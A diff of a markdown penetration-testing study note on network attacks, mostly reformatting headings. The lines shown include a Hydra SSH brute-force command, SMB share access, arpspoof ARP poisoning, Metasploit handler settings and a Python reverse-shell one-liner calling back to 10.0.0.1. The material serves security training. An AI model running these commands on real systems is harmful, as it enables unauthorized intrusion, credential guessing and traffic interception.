@@ -1,12 +1,10 @@
 # Network Attacks
 
-## Network Attacks
-
-### Authentication Cracking
+## Authentication Cracking
 
 A similar approach to cracking a password can be used for every service requiring network authentication as: `ssh`, `telnet`, remote desktop, HTTP authentication, etc.
 
-### Brute Force vs Dictionary Attacks
+## Brute Force vs Dictionary Attacks
 
 Performing pure brute force attacks over a network are very impractical because of the time needed to run each probe:
 
@@ -15,7 +13,7 @@ Performing pure brute force attacks over a network are very impractical because 
 * Processing time on the attacked server.
 * Network authentication cracking _relies almost entirely on dictionary-based attacks_, using dictionaries of common and default usernames and passwords
 
-**Hydra**
+### **Hydra**
 
 Fast, parallelized, network authentication cracker that supports different protocols: Cisco auth, `FTP`, `HTTP`, `IMAP`, `RDP`, `SMB`, `SSH`, `Telnet`...
 
@@ -45,7 +43,7 @@ hydra 10.10.10.3 ssh -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Pas
 # -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
 ```
 
-### Windows Shares
+## Windows Shares
 
 > Ability to:
 >
@@ -65,7 +63,7 @@ Windows' filesharing can be exploited via _NetBIOS_ \(Network Basic Input Output
   * Names to find workgroups.
   * Sessions to transmit data to and from a Windows share.
 
-#### Shares
+### Shares
 
 An authorized user can access shares by using **UNC Paths \(Universal Naming Connection Paths**:
 
@@ -82,7 +80,7 @@ An authorized user can access shares by using **UNC Paths \(Universal Naming Con
 > * Unauthorized file access.
 > * Information leakage used to mount a targeted attack.
 
-### Null Sessions
+## Null Sessions
 
 Null session attacks can be used to enumerate a lot of information: Passwords, System users, System groups, Running system processes.
 
@@ -92,7 +90,7 @@ Null session attacks can be used to enumerate a lot of information: Passwords, S
 * Exploits an authentication vulnerability for Windows Administrative Shares, lets an attacker connect to a local or remote share without authentication.
 * Enumerating shares is the first step needed to exploit a Windows machine vulnerable to null sessions.
 
-#### Tools
+### Tools
 
 * `nbstat`: windows cmd tool that can display info about the target.
 * `nbstat -A <IP>`: displays info about a target.
@@ -217,7 +215,7 @@ smb: \> ls
 smb: \> get flag.txt /home/kali/Desktop/flag.txt
 ```
 
-### ARP Poisoning
+## ARP Poisoning
 
 If an attacker finds a way to manipulate the ARP cache, then the attacker will also be able to receive traffic destined to other IP addresses.
 
@@ -235,7 +233,7 @@ If an attacker finds a way to manipulate the ARP cache, then the attacker will a
 * The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so.
 * This kind of attack can be used on an entire network and against a router, letting the attacker intercept the communication between a LAN and the internet.
 
-#### Dsniff Arpspoof
+### Dsniff Arpspoof
 
 Collection of tools for network auditing and penetration testing, including `arpspoof`, designed to intercept traffic on a switched LAN. `arpspoof` redirects packets from a target host \(or all hosts\) on the LAN intended for another host on the LAN by forging ARP replies.
 
@@ -253,7 +251,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 arpspoof -i tap0 -t 10.100.13.37 -r 10.100.13.36
 ```
 
-### Metasploit
+## Metasploit
 
 Metasploit is an open-source framework used for penetration testing and exploit development, giving a wide array of community contributed exploits and attack vectors that can be used against various systems. Extensible.
 
@@ -324,7 +322,7 @@ set DisablePayloadHandler false
 exploit //if the backdoor doesn't start immediately, use "exploit -j" instead
 ```
 
-### Meterpreter
+## Meterpreter
 
 > Ability to:
 >
@@ -382,7 +380,7 @@ Inside a `msfconsole`:
 run post/windows/gather/win_privs
 ```
 
-### Shells
+## Shells
 
 ```bash
 system('ls');
@@ -412,7 +410,7 @@ Reverse Shell is the most common one we'll use:
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-#### msfvenom
+### msfvenom
 
 ```bash
 # msfvenom
